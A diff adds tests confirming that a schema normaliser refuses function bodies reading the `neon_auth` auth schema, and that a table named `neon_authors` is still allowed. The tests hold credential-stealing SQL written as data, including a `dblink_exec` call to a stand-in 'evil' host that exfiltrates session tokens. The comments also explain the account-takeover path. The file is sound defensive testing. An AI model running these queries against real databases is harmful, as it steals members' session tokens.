@@ -72,3 +72,36 @@ test("the guard is in the normaliser, which every build passes through", () => {
   const norm = src.slice(src.indexOf("export function normalizeSchema"), src.indexOf("async function pgTrigger"));
   assert.match(norm, /_\(secrets\|meta\|users/, "the refusal must live inside normalizeSchema");
 });
+
+test("neon_auth is refused — it is where the live sessions actually are", () => {
+  // THE GAP THE UNDERSCORE LIST LEFT WIDE OPEN. Those `_something` names are
+  // OURS, and most went with the hand-built auth layer on 2026-07-30. Identity
+  // today lives in `neon_auth."user"` / `.session` / `.account` / `.verification`,
+  // created by Neon Auth — none of which match `_something`. So the deny-list
+  // was guarding deleted tables while the real store stood open.
+  //
+  // Every model function is SECURITY DEFINER (bypasses RLS) and a non-`internal`
+  // one is GRANTed to `anonymous`, so a body reading `neon_auth.session` hands
+  // any visitor every member's live session token — account takeover of that
+  // site — and `dblink` is installable on Neon, so it can be posted outbound.
+  for (const b of [
+    "SELECT token FROM neon_auth.session",
+    'SELECT * FROM neon_auth."user"',
+    "SELECT * FROM NEON_AUTH.account",
+    "SELECT accessToken FROM neon_auth.account WHERE 1=1",
+    "SELECT identifier, value FROM neon_auth.verification",
+    "SELECT dblink_exec('host=evil', 'SELECT token FROM neon_auth.session')",
+  ]) {
+    assert.deepEqual(fns(b), [], "must refuse: " + b);
+  }
+});
+
+test("a table merely NAMED like the auth schema is not caught by it", () => {
+  // Word-bounded, like the underscore list: `neon_authors` is an ordinary table
+  // name and refusing it would be the blanket-refusal direction.
+  const s = {
+    tables: [{ name: "neon_authors", access: "display", columns: ["name"] }],
+    functions: [{ name: "ok_fn", returns: "text", body: "SELECT name FROM neon_authors", language: "sql" }],
+  };
+  assert.deepEqual((normalizeSchema(s).functions || []).map((f) => f.name), ["ok_fn"]);
+});
